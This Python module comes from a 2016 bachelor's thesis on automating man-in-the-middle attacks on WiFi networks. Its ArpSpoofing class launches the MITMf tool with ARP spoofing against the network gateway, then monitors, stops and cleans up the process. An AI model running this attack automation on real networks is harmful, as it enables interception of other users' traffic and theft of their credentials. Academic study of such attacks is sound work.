#!/usr/bin/env python3
"""
Tampering with network topology

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import logging
import os
import subprocess
import tempfile
import time
from enum import Enum, unique

from .model import WirelessInterface

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class ArpSpoofing(object):
    """
    "MITMf aims to provide a one-stop-shop for Man-In-The-Middle and network attacks while updating and improving
    existing attacks and techniques.
    Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost
    completely re-written from scratch to provide a modular and easily extendible framework that anyone can use to
    implement their own MITM attack."
    `Framework for Man-In-The-Middle attacks <https://github.com/byt3bl33d3r/MITMf>`_
    """

    @unique
    class State(Enum):
        """
        MITMf process states.
        """
        ok = 0
        new = 1  # just started
        terminated = 100

    def __init__(self, interface):
        """
        :param interface: WirelessInterface object or string representing wireless interface name
        """
        self.process = None
        self.state = None

        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

        self.interface = WirelessInterface.get_wireless_interface_obj(interface)
        self.spoof_started_found = False

    def start(self):
        self.state = self.__class__.State.new

        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='ArpSpoofing-stdout')
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='ArpSpoofing-stderr')
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        cmd = ['mitmf',
               '-i', self.interface.name,
               '--spoof', '--arp',
               '--gateway', self.interface.gateway]
        self.process = subprocess.Popen(cmd,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        logger.debug('ArpSpoofing started; stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        """
        # is process running?
        if self.process.poll() is not None:
            self.state = self.__class__.State.terminated

        # check every added line in stdout
        for line in self.process_stdout_r:
            if not self.spoof_started_found and line == '|_ SMB server online\n':
                self.spoof_started_found = True
            elif self.spoof_started_found and line != '\n':
                print('ArpSpoofing stdout:' + line, end='')

        # check every added line in stdout
        for line in self.process_stderr_r:
            if ' * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)\n' == line:
                continue
            print('ArpSpoofing stderr:' + line, end='')

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                for t in range(10):
                    exitcode = self.process.poll()
                    if exitcode:
                        break
                    logger.debug('waiting for ArpSpoofing to terminate (' + str(t) + '/20)')
                    time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logger.debug('ArpSpoofing killed')

            self.process = None
            self.state = self.__class__.State.terminated
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logger.debug('ArpSpoofing clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove state
        self.state = None
